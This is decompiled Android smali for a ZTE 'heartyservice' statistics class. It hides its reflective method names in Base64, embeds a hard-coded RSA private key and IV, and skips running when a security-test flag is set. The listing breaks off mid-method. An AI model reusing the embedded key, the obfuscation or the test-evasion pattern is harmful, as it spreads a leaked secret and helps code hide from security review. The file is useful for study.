.class public Lcom/zte/heartyservice/main/staService;
.super Ljava/lang/Object;
.source "staService.java"


# static fields
.field private static final AST:Ljava/lang/String; = null

.field private static IV:[B = null

.field private static final MSG_CACTTD:I = 0x1

.field private static final MSG_RL:I = 0x2

.field private static final MSG_START:I = 0x4

.field private static final MSG_TLN:I = 0x3

.field private static encodedKey:[B

.field private static mStaService:Lcom/zte/heartyservice/main/staService;

.field private static pIntent:Landroid/app/PendingIntent;

.field private static wait:Ljava/lang/Object;


# instance fields
.field private alarm:Landroid/app/AlarmManager;

.field private did:Ljava/lang/String;

.field private k3:Ljava/security/Key;

.field private mAdapter:Lcom/zte/heartyservice/main/staAdapter;

.field private mHandler:Landroid/os/Handler;

.field private mReceiver:Landroid/content/BroadcastReceiver;

.field private mTm:Landroid/telephony/TelephonyManager;

.field private pm:Landroid/content/pm/PackageManager;

.field private sContext:Landroid/content/Context;

.field private sid:Ljava/lang/String;

.field private staThread:Ljava/lang/Thread;


# direct methods
.method static constructor <clinit>()V
    .locals 4

    .prologue
    const/4 v3, 0x0

    .line 54
    sput-object v3, Lcom/zte/heartyservice/main/staService;->mStaService:Lcom/zte/heartyservice/main/staService;

    .line 64
    new-instance v0, Ljava/lang/String;

    const-string v1, "Y29tLnp0ZS5ocy5zdGEuU3RhLnRpbWVy"

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v2, 0x2

    invoke-static {v1, v2}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    sput-object v0, Lcom/zte/heartyservice/main/staService;->AST:Ljava/lang/String;

    .line 65
    sput-object v3, Lcom/zte/heartyservice/main/staService;->pIntent:Landroid/app/PendingIntent;

    .line 67
    const/16 v0, 0x27a

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lcom/zte/heartyservice/main/staService;->encodedKey:[B

    .line 77
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/zte/heartyservice/main/staService;->wait:Ljava/lang/Object;

    .line 468
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    sput-object v0, Lcom/zte/heartyservice/main/staService;->IV:[B

    return-void

    .line 67
    nop

    :array_0
    .array-data 0x1
        0x30t
        0x82t
        0x2t
        0x76t
        0x2t
        0x1t
        0x0t
        0x30t
        0xdt
        0x6t
        0x9t
        0x2at
        0x86t
        0x48t
        0x86t
        0xf7t
        0xdt
        0x1t
        0x1t
        0x1t
        0x5t
        0x0t
        0x4t
        0x82t
        0x2t
        0x60t
        0x30t
        0x82t
        0x2t
        0x5ct
        0x2t
        0x1t
        0x0t
        0x2t
        0x81t
        0x81t
        0x0t
        0xb1t
        0xbft
        0x93t
        0xaet
        0x86t
        0xa1t
        0xcft
        0x1et
        0xbdt
        0x93t
        0xb0t
        0x46t
        0xdbt
        0xfet
        0x99t
        0x84t
        0xb5t
        0xeat
        0xa9t
        0x2et
        0x13t
        0xd1t
        0xbct
        0x22t
        0x3ft
        0xbbt
        0x72t
        0xb8t
        0xdat
        0xc3t
        0x28t
        0x13t
        0x1dt
        0xeet
        0xd1t
        0x92t
        0x6ct
        0xcdt
        0x8at
        0xa6t
        0xddt
        0x11t
        0x4at
        0x58t
        0x3et
        0x4dt
        0xact
        0xe3t
        0xd8t
        0x35t
        0x8dt
        0x10t
        0x75t
        0x65t
        0x39t
        0xe6t
        0xe3t
        0xb8t
        0x18t
        0x88t
        0xc2t
        0xd0t
        0xf5t
        0xd9t
        0x4ft
        0x3ct
        0xf5t
        0x43t
        0xcat
        0xa0t
        0x4t
        0x50t
        0xa8t
        0x96t
        0x56t
        0xa7t
        0x12t
        0xadt
        0xfat
        0x2dt
        0xcft
        0x9et
        0x96t
        0xd6t
        0xdbt
        0x2bt
        0x28t
        0xb2t
        0x48t
        0xc6t
        0xd7t
        0xdat
        0x53t
        0xb6t
        0xet
        0xfdt
        0xb6t
        0xa1t
        0x64t
        0xf3t
        0xa6t
        0xdct
        0xdft
        0xf8t
        0x7ct
        0xa8t
        0x91t
        0xc5t
        0xa5t
        0xa7t
        0x48t
        0x68t
        0x7dt
        0xf8t
        0x7bt
        0x96t
        0xft
        0x9t
        0x70t
        0xf1t
        0xfdt
        0xe7t
        0xc4t
        0x9t
        0xcet
        0xd9t
        0x13t
        0xbbt
        0x2t
        0x3t
        0x1t
        0x0t
        0x1t
        0x2t
        0x81t
        0x81t
        0x0t
        0xabt
        0x19t
        0xcdt
        0x21t
        0x5dt
        0x3bt
        0xf9t
        0x52t
        0x90t
        0xet
        0xd0t
        0xcbt
        0x5t
        0xet
        0x29t
        0xddt
        0x53t
        0xf8t
        0x55t
        0x6et
        0xa3t
        0x69t
        0x6bt
        0x7et
        0x54t
        0x77t
        0x2et
        0x51t
        0xbft
        0x53t
        0xc9t
        0x9t
        0xcdt
        0xf0t
        0x8ct
        0x10t
        0x35t
        0x68t
        0xet
        0x25t
        0xddt
        0xfbt
        0xbct
        0xe3t
        0x0t
        0xe6t
        0x68t
        0x9ct
        0xd3t
        0xdt
        0x89t
        0x82t
        0xe4t
        0x5et
        0xd2t
        0xc3t
        0xedt
        0x44t
        0xd3t
        0x69t
        0x22t
        0x8ft
        0x5ft
        0x77t
        0x7bt
        0x19t
        0xc4t
        0xc8t
        0xd7t
        0x62t
        0xdat
        0xeat
        0x4et
        0xf4t
        0xbet
        0x5ft
        0xadt
        0x44t
        0xd2t
        0xa6t
        0x2at
        0x8et
        0xf6t
        0x5dt
        0xe1t
        0xd2t
        0xb2t
        0x1et
        0xaet
        0x2ct
        0xcft
        0x70t
        0xf1t
        0x19t
        0x79t
        0x5bt
        0xf3t
        0x92t
        0x9at
        0x9dt
        0xf0t
        0x37t
        0x50t
        0x65t
        0xe4t
        0xabt
        0x58t
        0x8dt
        0x27t
        0x28t
        0xb2t
        0xdbt
        0x34t
        0x33t
        0x35t
        0xf6t
        0x34t
        0x9dt
        0xb8t
        0x71t
        0x4ct
        0x20t
        0x4et
        0x44t
        0x5bt
        0xadt
        0x68t
        0x81t
        0x2t
        0x41t
        0x0t
        0xddt
        0x2bt
        0xa7t
        0x80t
        0x95t
        0x28t
        0x93t
        0x2dt
        0xc2t
        0x52t
        0x96t
        0x79t
        0xdat
        0xb7t
        0x73t
        0x31t
        0x4bt
        0x95t
        0x48t
        0xbct
        0x8ct
        0xa6t
        0xd9t
        0x16t
        0x36t
        0xbct
        0x41t
        0x89t
        0xe0t
        0x89t
        0xc4t
        0xedt
        0x74t
        0x2t
        0xb1t
        0xect
        0x1ct
        0x73t
        0x47t
        0xf6t
        0xaet
        0x93t
        0x8bt
        0xbt
        0xddt
        0x6ct
        0x16t
        0x82t
        0x3et
        0x63t
        0x67t
        0x85t
        0x8et
        0x2et
        0x4ct
        0x3dt
        0x68t
        0xd0t
        0x4t
        0xf6t
        0x37t
        0xfdt
        0xc3t
        0x9bt
        0x2t
        0x41t
        0x0t
        0xcdt
        0xbdt
        0x62t
        0xc1t
        0x83t
        0xet
        0x4ct
        0x95t
        0xeft
        0x51t
        0x56t
        0xe5t
        0x39t
        0x4et
        0xe6t
        0xd6t
        0xdet
        0x8at
        0x53t
        0xf7t
        0x96t
        0xat
        0x3bt
        0x54t
        0x9dt
        0xe9t
        0xb6t
        0x10t
        0x8ft
        0x2dt
        0xe7t
        0xbt
        0x2ft
        0x1bt
        0x66t
        0x42t
        0x47t
        0xbct
        0x38t
        0x25t
        0x2bt
        0x77t
        0x82t
        0x1t
        0x19t
        0x8t
        0xa6t
        0x24t
        0xd7t
        0x91t
        0x34t
        0xd8t
        0xd3t
        0x6dt
        0x73t
        0xdft
        0x36t
        0x82t
        0xf8t
        0xdet
        0x0t
        0xct
        0x42t
        0x61t
        0x2t
        0x40t
        0x8t
        0x9t
        0x6t
        0xfbt
        0xdft
        0xeft
        0x6at
        0x71t
        0x76t
        0x26t
        0xe3t
        0xfat
        0xa7t
        0x5ct
        0x94t
        0xddt
        0xcct
        0x9et
        0x2et
        0xd7t
        0x52t
        0xd0t
        0xd9t
        0x0t
        0x3at
        0x9at
        0xdat
        0x52t
        0xb5t
        0xat
        0xact
        0x51t
        0xe8t
        0x2et
        0x14t
        0xe2t
        0xbct
        0x21t
        0xe0t
        0x12t
        0x71t
        0x43t
        0x41t
        0x0t
        0xfct
        0x59t
        0x69t
        0xf3t
        0xeft
        0x6at
        0x53t
        0x1ft
        0x82t
        0xbt
        0xe2t
        0x8ft
        0x34t
        0x98t
        0xa2t
        0x25t
        0x83t
        0xe1t
        0x3ft
        0x53t
        0x2t
        0x40t
        0x24t
        0x35t
        0x66t
        0x82t
        0x4t
        0x1ct
        0xaat
        0x21t
        0xe1t
        0x22t
        0x81t
        0x96t
        0x8at
        0x5t
        0x76t
        0xdet
        0xedt
        0xfft
        0x8et
        0x53t
        0x8et
        0x96t
        0x72t
        0x66t
        0xabt
        0xfct
        0xbt
        0xcct
        0xd2t
        0x46t
        0x13t
        0xd9t
        0x86t
        0xat
        0xdet
        0x6et
        0x5ft
        0xcdt
        0xa2t
        0x5bt
        0xf8t
        0x50t
        0x6at
        0x12t
        0xe3t
        0x63t
        0x0t
        0x4at
        0x8ft
        0x9dt
        0xc0t
        0x9dt
        0x40t
        0x68t
        0x8ct
        0xf2t
        0x5t
        0xd7t
        0xfbt
        0x10t
        0xa7t
        0x15t
        0x81t
        0x41t
        0x2t
        0x40t
        0x7bt
        0x2bt
        0x67t
        0x9ft
        0x4at
        0xa5t
        0x69t
        0x5bt
        0xb7t
        0x69t
        0xd8t
        0x9t
        0xf9t
        0x71t
        0xcct
        0x90t
        0x7dt
        0x66t
        0xa6t
        0x12t
        0x97t
        0x5ct
        0x19t
        0xa4t
        0x47t
        0x8et
        0xdct
        0xdt
        0xddt
        0x6ft
        0xd7t
        0x3at
        0xe9t
        0x15t
        0x4ct
        0x5bt
        0x87t
        0xa7t
        0xddt
        0x5at
        0xbt
        0x3at
        0xa7t
        0xd0t
        0xcet
        0xdet
        0x42t
        0x52t
        0x17t
        0xcbt
        0xdbt
        0x59t
        0xd1t
        0x1ct
        0x73t
        0x27t
        0xd2t
        0xcct
        0x9ct
        0xc1t
        0x20t
        0xa0t
        0x1ct
        0x3dt
    .end array-data

    .line 468
    nop

    :array_1
    .array-data 0x1
        0x13t
        0x2t
        0x37t
        0x4t
        0x5t
        0x1t
        0x6at
        0x8t
        0x1at
        0x7ft
        0x35t
        0x2bt
        0xat
        0x2t
        0x77t
        0x18t
    .end array-data
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 4
    .parameter "context"

    .prologue
    const/4 v1, 0x0

    .line 140
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 55
    iput-object v1, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    .line 56
    iput-object v1, p0, Lcom/zte/heartyservice/main/staService;->pm:Landroid/content/pm/PackageManager;

    .line 57
    iput-object v1, p0, Lcom/zte/heartyservice/main/staService;->alarm:Landroid/app/AlarmManager;

    .line 58
    iput-object v1, p0, Lcom/zte/heartyservice/main/staService;->mTm:Landroid/telephony/TelephonyManager;

    .line 59
    const-string v0, ""

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->did:Ljava/lang/String;

    .line 60
    const-string v0, ""

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->sid:Ljava/lang/String;

    .line 61
    iput-object v1, p0, Lcom/zte/heartyservice/main/staService;->staThread:Ljava/lang/Thread;

    .line 62
    iput-object v1, p0, Lcom/zte/heartyservice/main/staService;->mAdapter:Lcom/zte/heartyservice/main/staAdapter;

    .line 66
    iput-object v1, p0, Lcom/zte/heartyservice/main/staService;->k3:Ljava/security/Key;

    .line 78
    new-instance v0, Lcom/zte/heartyservice/main/staService$1;

    invoke-direct {v0, p0}, Lcom/zte/heartyservice/main/staService$1;-><init>(Lcom/zte/heartyservice/main/staService;)V

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->mHandler:Landroid/os/Handler;

    .line 538
    new-instance v0, Lcom/zte/heartyservice/main/staService$4;

    invoke-direct {v0, p0}, Lcom/zte/heartyservice/main/staService$4;-><init>(Lcom/zte/heartyservice/main/staService;)V

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->mReceiver:Landroid/content/BroadcastReceiver;

    .line 141
    iput-object p1, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    .line 142
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    const/4 v1, 0x0

    new-instance v2, Landroid/content/Intent;

    sget-object v3, Lcom/zte/heartyservice/main/staService;->AST:Ljava/lang/String;

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v3, 0x800

    invoke-static {v0, v1, v2, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    sput-object v0, Lcom/zte/heartyservice/main/staService;->pIntent:Landroid/app/PendingIntent;

    .line 144
    invoke-static {}, Lcom/zte/heartyservice/main/staService;->w()V

    .line 146
    invoke-static {}, Lcom/zte/heartyservice/common/utils/XmlParseUtils;->isSecurityTestVersion()Z

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    .line 180
    :goto_0
    return-void

    .line 150
    :cond_0
    new-instance v0, Lcom/zte/heartyservice/main/staService$2;

    invoke-direct {v0, p0}, Lcom/zte/heartyservice/main/staService$2;-><init>(Lcom/zte/heartyservice/main/staService;)V

    invoke-virtual {v0}, Lcom/zte/heartyservice/main/staService$2;->start()V

    goto :goto_0
.end method

.method private a()V
    .locals 2

    .prologue
    .line 110
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->mHandler:Landroid/os/Handler;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    .line 111
    return-void
.end method

.method static synthetic access$000(Lcom/zte/heartyservice/main/staService;)V
    .locals 0
    .parameter "x0"

    .prologue
    .line 52
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->d()V

    return-void
.end method

.method static synthetic access$100(Lcom/zte/heartyservice/main/staService;)Lcom/zte/heartyservice/main/staAdapter;
    .locals 1
    .parameter "x0"

    .prologue
    .line 52
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->mAdapter:Lcom/zte/heartyservice/main/staAdapter;

    return-object v0
.end method

.method static synthetic access$1000(Lcom/zte/heartyservice/main/staService;)V
    .locals 0
    .parameter "x0"

    .prologue
    .line 52
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->a()V

    return-void
.end method

.method static synthetic access$1100(Lcom/zte/heartyservice/main/staService;)V
    .locals 0
    .parameter "x0"

    .prologue
    .line 52
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->b()V

    return-void
.end method

.method static synthetic access$1200(Lcom/zte/heartyservice/main/staService;)V
    .locals 0
    .parameter "x0"

    .prologue
    .line 52
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->c()V

    return-void
.end method

.method static synthetic access$1300()Ljava/lang/String;
    .locals 1

    .prologue
    .line 52
    sget-object v0, Lcom/zte/heartyservice/main/staService;->AST:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$1400()V
    .locals 0

    .prologue
    .line 52
    invoke-static {}, Lcom/zte/heartyservice/main/staService;->w()V

    return-void
.end method

.method static synthetic access$200()Ljava/lang/Object;
    .locals 1

    .prologue
    .line 52
    sget-object v0, Lcom/zte/heartyservice/main/staService;->wait:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic access$300(Lcom/zte/heartyservice/main/staService;)V
    .locals 0
    .parameter "x0"

    .prologue
    .line 52
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->start()V

    return-void
.end method

.method static synthetic access$400(Lcom/zte/heartyservice/main/staService;)Landroid/content/pm/PackageManager;
    .locals 1
    .parameter "x0"

    .prologue
    .line 52
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->pm:Landroid/content/pm/PackageManager;

    return-object v0
.end method

.method static synthetic access$500(Lcom/zte/heartyservice/main/staService;)Landroid/content/Context;
    .locals 1
    .parameter "x0"

    .prologue
    .line 52
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$600(Lcom/zte/heartyservice/main/staService;Landroid/content/Context;Ljava/lang/String;Landroid/content/pm/PackageInfo;)Z
    .locals 1
    .parameter "x0"
    .parameter "x1"
    .parameter "x2"
    .parameter "x3"

    .prologue
    .line 52
    invoke-direct {p0, p1, p2, p3}, Lcom/zte/heartyservice/main/staService;->i(Landroid/content/Context;Ljava/lang/String;Landroid/content/pm/PackageInfo;)Z

    move-result v0

    return v0
.end method

.method static synthetic access$700(Lcom/zte/heartyservice/main/staService;)V
    .locals 0
    .parameter "x0"

    .prologue
    .line 52
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->p()V

    return-void
.end method

.method static synthetic access$800(Lcom/zte/heartyservice/main/staService;Landroid/content/Context;)Z
    .locals 1
    .parameter "x0"
    .parameter "x1"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 52
    invoke-direct {p0, p1}, Lcom/zte/heartyservice/main/staService;->r(Landroid/content/Context;)Z

    move-result v0

    return v0
.end method

.method static synthetic access$902(Lcom/zte/heartyservice/main/staService;Ljava/lang/Thread;)Ljava/lang/Thread;
    .locals 0
    .parameter "x0"
    .parameter "x1"

    .prologue
    .line 52
    iput-object p1, p0, Lcom/zte/heartyservice/main/staService;->staThread:Ljava/lang/Thread;

    return-object p1
.end method

.method private b()V
    .locals 5

    .prologue
    .line 115
    iget-object v1, p0, Lcom/zte/heartyservice/main/staService;->mHandler:Landroid/os/Handler;

    const/4 v2, 0x2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/os/Handler;->obtainMessage(ILjava/lang/Object;)Landroid/os/Message;

    move-result-object v0

    .line 116
    .local v0, msg:Landroid/os/Message;
    iget-object v1, p0, Lcom/zte/heartyservice/main/staService;->mHandler:Landroid/os/Handler;

    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    .line 117
    return-void
.end method

.method private c()V
    .locals 2

    .prologue
    .line 121
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->mHandler:Landroid/os/Handler;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    .line 122
    return-void
.end method

.method private d()V
    .locals 2

    .prologue
    .line 232
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->staThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 320
    :goto_0
    return-void

    .line 236
    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/zte/heartyservice/main/staService$3;

    invoke-direct {v1, p0}, Lcom/zte/heartyservice/main/staService$3;-><init>(Lcom/zte/heartyservice/main/staService;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->staThread:Ljava/lang/Thread;

    .line 319
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->staThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0
.end method

.method private f(Landroid/content/Context;)Ljava/util/HashMap;
    .locals 8
    .parameter "context"
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")",
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 338
    new-instance v7, Ljava/util/HashMap;

    invoke-direct {v7}, Ljava/util/HashMap;-><init>()V

    .line 341
    .local v7, aa:Ljava/util/HashMap;,"Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;"
    :try_start_0
    new-instance v2, Ljava/lang/String;

    const-string v1, "Y29tLnp0ZS5ocy5zdGEuU3Rh"

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v3, 0x2

    invoke-static {v1, v3}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/String;

    const-string v1, "Z2V0UGFyYW1ldGVycw=="

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v5, 0x2

    invoke-static {v1, v5}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v4, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v1, 0x1

    new-array v5, v1, [Ljava/lang/Object;

    const/4 v1, 0x0

    aput-object p1, v5, v1

    const/4 v6, 0x0

    move-object v1, p1

    invoke-static/range {v1 .. v6}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    move-object v0, v1

    check-cast v0, Ljava/util/HashMap;

    move-object v7, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 345
    :goto_0
    return-object v7

    .line 342
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method private g(Landroid/content/Context;Ljava/util/List;)Ljava/lang/String;
    .locals 8
    .parameter "context"
    .parameter "list"

    .prologue
    .line 351
    const/4 v7, 0x0

    .line 354
    .local v7, aa:Ljava/lang/String;
    :try_start_0
    new-instance v2, Ljava/lang/String;

    const-string v1, "Y29tLnp0ZS5ocy5zdGEuU3Rh"

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v3, 0x2

    invoke-static {v1, v3}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/String;

    const-string v1, "Z2V0Qm9keQ=="

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v5, 0x2

    invoke-static {v1, v5}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v4, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v1, 0x2

    new-array v5, v1, [Ljava/lang/Object;

    const/4 v1, 0x0

    aput-object p1, v5, v1

    const/4 v1, 0x1

    aput-object p2, v5, v1

    const/4 v6, 0x0

    move-object v1, p1

    invoke-static/range {v1 .. v6}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    move-object v0, v1

    check-cast v0, Ljava/lang/String;

    move-object v7, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 358
    :goto_0
    return-object v7

    .line 355
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public static getInstance(Landroid/content/Context;)Lcom/zte/heartyservice/main/staService;
    .locals 2
    .parameter "context"

    .prologue
    .line 131
    :try_start_0
    sget-object v1, Lcom/zte/heartyservice/main/staService;->mStaService:Lcom/zte/heartyservice/main/staService;

    if-nez v1, :cond_0

    .line 132
    new-instance v1, Lcom/zte/heartyservice/main/staService;

    invoke-direct {v1, p0}, Lcom/zte/heartyservice/main/staService;-><init>(Landroid/content/Context;)V

    sput-object v1, Lcom/zte/heartyservice/main/staService;->mStaService:Lcom/zte/heartyservice/main/staService;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 137
    :cond_0
    :goto_0
    sget-object v1, Lcom/zte/heartyservice/main/staService;->mStaService:Lcom/zte/heartyservice/main/staService;

    return-object v1

    .line 134
    :catch_0
    move-exception v0

    .line 135
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private h(Landroid/content/Context;)Ljava/lang/String;
    .locals 8
    .parameter "context"

    .prologue
    .line 364
    const/4 v7, 0x0

    .line 367
    .local v7, aa:Ljava/lang/String;
    :try_start_0
    new-instance v2, Ljava/lang/String;

    const-string v1, "Y29tLnp0ZS5ocy5zdGEuU3Rh"

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v3, 0x2

    invoke-static {v1, v3}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/String;

    const-string v1, "Z2V0VXJs"

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v5, 0x2

    invoke-static {v1, v5}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v4, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v1, 0x1

    new-array v5, v1, [Ljava/lang/Object;

    const/4 v1, 0x0

    aput-object p1, v5, v1

    const/4 v6, 0x0

    move-object v1, p1

    invoke-static/range {v1 .. v6}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    move-object v0, v1

    check-cast v0, Ljava/lang/String;

    move-object v7, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 371
    :goto_0
    return-object v7

    .line 368
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method private i(Landroid/content/Context;Ljava/lang/String;Landroid/content/pm/PackageInfo;)Z
    .locals 24
    .parameter "context"
    .parameter "n"
    .parameter "pinfo"

    .prologue
    .line 376
    const/16 v21, 0x0

    .line 378
    .local v21, ret:Z
    const/4 v8, 0x0

    .line 379
    .local v8, aa:Ljava/util/List;,"Ljava/util/List<Ljava/lang/String;>;"
    move-object/from16 v15, p3

    .line 380
    .local v15, info:Landroid/content/pm/PackageInfo;
    const/4 v13, 0x0

    .line 384
    .local v13, encoded:[B
    :try_start_0
    new-instance v3, Ljava/lang/String;

    const-string v2, "Y29tLnp0ZS5ocy5zdGEuU3Rh"

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    const/4 v4, 0x2

    invoke-static {v2, v4}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v2

    invoke-direct {v3, v2}, Ljava/lang/String;-><init>([B)V

    const/4 v4, 0x0

    new-instance v5, Ljava/lang/String;

    const-string v2, "Z2V0QXV0aEtleQ=="

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    const/4 v6, 0x2

    invoke-static {v2, v6}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v2

    invoke-direct {v5, v2}, Ljava/lang/String;-><init>([B)V

    const/4 v2, 0x1

    new-array v6, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p1, v6, v2

    const/4 v7, 0x0

    move-object/from16 v2, p1

    invoke-static/range {v2 .. v7}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v2

    move-object v0, v2

    check-cast v0, Ljava/util/List;

    move-object v8, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 390
    :goto_0
    if-eqz v8, :cond_0

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v2

    const/4 v3, 0x2

    if-ge v2, v3, :cond_1

    .line 391
    :cond_0
    const/4 v2, 0x0

    .line 453
    :goto_1
    return v2

    .line 395
    :cond_1
    if-nez v15, :cond_2

    .line 396
    :try_start_1
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/zte/heartyservice/main/staService;->pm:Landroid/content/pm/PackageManager;

    const/16 v3, 0x40

    move-object/from16 v0, p2

    invoke-virtual {v2, v0, v3}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v15

    .line 399
    :cond_2
    if-eqz v15, :cond_3

    .line 400
    iget-object v2, v15, Landroid/content/pm/PackageInfo;->signatures:[Landroid/content/pm/Signature;

    const/4 v3, 0x0

    aget-object v22, v2, v3

    .line 401
    .local v22, s:Landroid/content/pm/Signature;
    const-string v2, "X.509"

    invoke-static {v2}, Ljava/security/cert/CertificateFactory;->getInstance(Ljava/lang/String;)Ljava/security/cert/CertificateFactory;

    move-result-object v12

    .line 402
    .local v12, certFactory:Ljava/security/cert/CertificateFactory;
    new-instance v10, Ljava/io/ByteArrayInputStream;

    invoke-virtual/range {v22 .. v22}, Landroid/content/pm/Signature;->toByteArray()[B

    move-result-object v2

    invoke-direct {v10, v2}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    .line 403
    .local v10, bais:Ljava/io/ByteArrayInputStream;
